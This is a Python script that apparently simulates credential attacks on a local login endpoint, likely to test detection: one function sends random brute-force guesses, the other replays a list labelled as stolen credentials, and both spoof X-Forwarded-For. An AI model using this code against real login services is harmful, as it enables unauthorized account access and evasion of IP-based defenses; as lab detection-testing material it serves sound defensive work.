import requests
import time
import random

TARGET = "http://127.0.0.1:5001/login"

usernames = ["admin", "root", "user", "administrator", "test"]
passwords = ["123456", "password", "admin", "root", "letmein", "qwerty"]

STOLEN_CREDENTIALS = [
    {"username": "john.doe", "password": "Summer2024!"},
    {"username": "admin.user", "password": "Company@123"},
    {"username": "finance_head", "password": "Welcome1!"},
    {"username": "ceo_account", "password": "Board@2024"},
    {"username": "sysadmin", "password": "Root@Linux1"},
]

def simulate_brute_force(attempts=20, source_ip="192.168.1.100"):
    print(f"[ATTACKER] Starting brute force simulation — {attempts} attempts")
    print(f"[ATTACKER] Simulated source IP: {source_ip}")
    print(f"[ATTACKER] Target: {TARGET}")
    print("-" * 50)

    for i in range(attempts):
        username = random.choice(usernames)
        password = random.choice(passwords)

        try:
            response = requests.post(
                TARGET,
                json={"username": username, "password": password},
                headers={"X-Forwarded-For": source_ip}
            )
            print(f"[ATTACKER] Attempt {i+1}: {username}:{password} → {response.status_code}")
        except Exception as e:
            print(f"[ATTACKER] Connection failed: {e}")

        time.sleep(0.3)

    print("-" * 50)
    print("[ATTACKER] Brute force simulation complete.")

def simulate_valid_accounts(attempts=5, source_ip="192.168.1.200"):
    print(f"\n[ATTACKER] Starting Valid Accounts simulation — {attempts} attempts")
    print(f"[ATTACKER] Simulated source IP: {source_ip}")
    print(f"[ATTACKER] Using stolen credentials")
    print("-" * 50)

    for i, cred in enumerate(STOLEN_CREDENTIALS[:attempts]):
        try:
            response = requests.post(
                TARGET,
                json=cred,
                headers={"X-Forwarded-For": source_ip}
            )
            print(f"[ATTACKER] Attempt {i+1}: {cred['username']}:{cred['password']} → {response.status_code}")
        except Exception as e:
            print(f"[ATTACKER] Connection failed: {e}")

        time.sleep(1)

    print("-" * 50)
    print("[ATTACKER] Valid Accounts simulation complete.")

if __name__ == "__main__":
    import sys
    if len(sys.argv) > 1 and sys.argv[1] == "t1078":
        simulate_valid_accounts(source_ip="192.168.1.200")
    else:
        simulate_brute_force(source_ip="192.168.1.100")
